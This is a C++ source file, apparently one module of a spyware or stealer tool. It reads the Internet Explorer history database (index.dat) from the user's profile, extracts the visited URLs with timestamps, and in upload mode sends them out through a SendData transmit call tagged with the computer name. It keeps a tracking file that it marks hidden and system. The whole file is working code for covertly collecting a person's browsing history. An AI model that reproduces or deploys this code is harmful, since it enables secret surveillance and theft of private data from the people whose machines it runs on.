/*
    Internet Explorer browser history grabber module;
    Grabs browsing history

    Author: Kulverstukas
*/

#include <iostream>
#include <fstream>
#include <algorithm>
#include <vector>
#include <cstring>
#include <time.h>
#include <sys/stat.h>
#include <windows.h>
#include "IEHistory.hpp"
#include "SendData.hpp"

using namespace std;

const string HISTORY_FILE = "index.dat";
const string IE_CONTROL_FILE = "iecontrol.dat";
const string PATH = "\\Local Settings\\History\\History.IE5\\";
const string HOME_PATH = "homepath";
const string HOME_DRIVE = "homedrive";
const int DATA_CHUNK = 4;
const int DATETIME_CHUNK = 8;
const int RECORD_OFFSET_BYTE = 52;
const int CLUSTER_SIZE = 128;


void IEHistory::readFile(bool upload, char* compName) {
    // create stuff
    string path = (((string)getenv(HOME_DRIVE.c_str()))+(string)getenv(HOME_PATH.c_str()))+PATH;
    int64_t prevMillis = 0;

    // check if a control file exists
    struct stat buff;
    string controlF = ((string)getenv(HOME_DRIVE.c_str()))+"\\"+IE_CONTROL_FILE;
    if (stat(controlF.c_str(), &buff) != -1) {
        ifstream controlFile(controlF.c_str());
        if (controlFile.is_open() and controlFile.good()) {
            string tmp;
            getline(controlFile, tmp);
            prevMillis = atoll(tmp.c_str());
        }
        controlFile.close();
    }

    ifstream indexFile((path+HISTORY_FILE).c_str(), ios::in|ios::binary);
    if (indexFile.is_open() and indexFile.good()) {
        char *tmp = new char[DATA_CHUNK];
        // get to 32nd byte and read address of first hash table
        indexFile.seekg(32, ios::beg);
        indexFile.read(tmp, DATA_CHUNK);

        int32_t tableOffset = readInt32(tmp);
        indexFile.seekg(tableOffset, ios::beg);
        indexFile.read(tmp, DATA_CHUNK);
        if (memcmp(tmp, "HASH", DATA_CHUNK) == 0) {
            vector<int32_t> tableOffsets = findTableOffsets(tableOffset, indexFile);
            vector<int32_t> tableRecords = findTableRecords(tableOffsets, indexFile);
            extractRecords(tableRecords, indexFile, prevMillis, upload, compName);
        }
    }
    indexFile.close();
};

vector<int32_t> IEHistory::findTableOffsets(int32_t firstOffset, ifstream &f) {
    f.seekg(0, ios::beg);
    vector<int32_t> offsets;
    offsets.push_back(firstOffset);
    int32_t offset = 1;
    char *chunk = new char[DATA_CHUNK];
    f.seekg(firstOffset, ios::beg);
    f.read(chunk, DATA_CHUNK);
    while (offset != 0) {
        if (memcmp(chunk, "HASH", DATA_CHUNK) == 0) {
            f.seekg(4, ios::cur);
            f.read(chunk, DATA_CHUNK);
            offset = readInt32(chunk);
            //printf("%d\n", offset);
            if (offset != 0) {
                offsets.push_back(offset);
                f.seekg(offset, ios::beg);
                f.read(chunk, DATA_CHUNK);
            }
        } else {
            break;
        }
    }
    return offsets;
};

vector<int32_t> IEHistory::findTableRecords(vector<int32_t> tables, ifstream &f) {
    f.seekg(0, ios::beg);
    vector<int32_t> records;
    records.reserve(512);
    char *chunk = new char[DATA_CHUNK];
    int32_t tableSize = 0;
    int32_t record = 0;
    int currPos = 0;
    int size = tables.size();
    for (int i = 0; i < size; i++) {
        f.seekg(tables[i]+4, ios::beg);
        f.read(chunk, DATA_CHUNK);
        tableSize = readInt32(chunk)*CLUSTER_SIZE;
        f.seekg(tables[i]+16, ios::beg);
        while (currPos <= tableSize) {
            f.seekg(4, ios::cur);
            f.read(chunk, DATA_CHUNK);
            record = readInt32(chunk);
            if ((record != 1) && (record != 3) && (record != 0)) {
                records.push_back(record);
            }
            currPos += 8;
        }
    }
    //cout << records.size() << endl;
    return records;
};

void IEHistory::extractRecords(vector<int32_t> records, ifstream &f, int64_t prevMillis, bool upload, char* compName) {
    f.seekg(0, ios::beg);
    int64_t lastMillis = prevMillis;
    ofstream outF;
    if (!upload) {
        outF.open("ie.txt", ios::app);
    }
    char *chunk = new char[DATA_CHUNK];
    char *ntDatetime = new char[DATETIME_CHUNK];
    char *singleByte = new char;
    string data;
    string transmissionData;
    SendData sendData;
    int size = records.size();
    for (int i = 0; i < size; i++) {
        f.seekg(records[i], ios::beg);
        f.read(chunk, DATA_CHUNK);
        if (memcmp(chunk, "URL ", DATA_CHUNK) == 0) {
            struct IEHistoryData ieData;
            f.seekg(records[i]+16, ios::beg);
            f.read(ntDatetime, DATETIME_CHUNK);
            if (lastMillis < readInt64(ntDatetime)) {
                lastMillis = readInt64(ntDatetime);
            }
            if (prevMillis < readInt64(ntDatetime)) {
                ieData.datetime = ntTimeToPrettyDate(readInt64(ntDatetime));
                f.seekg(records[i]+RECORD_OFFSET_BYTE);
                f.read(chunk, DATA_CHUNK);
                f.seekg(records[i]+readInt32(chunk));
                f.read(singleByte, 1);
                while (memcmp(singleByte, "\0", 1) != 0) {
                    data.append(singleByte, 1);
                    f.read(singleByte, 1);
                }
                ieData.url = formatLine(data);
                this->writeIEData(ieData, outF, upload, transmissionData);
                data = "";
                singleByte = new char;
            }
        }
    }
    if (upload) {
        sendData.transmit("IE", compName, "ie.txt", transmissionData);
    } else {
        outF.close();
    }
    // write last read millis to control file
    string controlF = ((string)getenv(HOME_DRIVE.c_str()))+"\\"+IE_CONTROL_FILE;
    ofstream controlFile(controlF.c_str());
    if (controlFile.is_open() and controlFile.good()) {
        controlFile << lastMillis << endl;
        //controlFile << 0 << endl;
    }
    controlFile.close();

    int attribs = GetFileAttributes(controlF.c_str());
    if ((attribs != FILE_ATTRIBUTE_HIDDEN) or (attribs != FILE_ATTRIBUTE_SYSTEM)) {
        SetFileAttributes(controlF.c_str(), FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
    }
};

inline int32_t IEHistory::readInt32(char *byteArray) {
    return *((int32_t*) byteArray);
};

inline int64_t IEHistory::readInt64(char *byteArray) {
    return *((int64_t*) byteArray);
};

string IEHistory::ntTimeToPrettyDate(int64_t ntTime) {
    time_t rawtime = (ntTime/10000000LL)-11644473600LL;
    struct tm *convertedTime;
    convertedTime = localtime(&rawtime);
    char result[22];
    strftime(result, 22, "%Y.%m.%d, %X", convertedTime);
    return (string)result;
};

string IEHistory::formatLine(string data) {
    int pos = data.find("@");
    data.erase(0,pos+1);
    pos = data.find("%20");
    while (pos != string::npos) {
        data.replace(pos,3," ");
        pos = data.find("%20");
    }
    return data;
};

void IEHistory::writeIEData(IEHistoryData data, ofstream &newFile, bool upload, string &transmissionData) {
    if (upload) {
        transmissionData.append("URL:\t"); transmissionData.append(data.url); transmissionData.append("\n");
        transmissionData.append("Date:\t"); transmissionData.append(data.datetime); transmissionData.append("\n");
        transmissionData.append("\n");
    } else {
        newFile << "URL:\t" << data.url << endl;
        newFile << "Date:\t" << data.datetime << endl;
        newFile << "\n";
    }
};
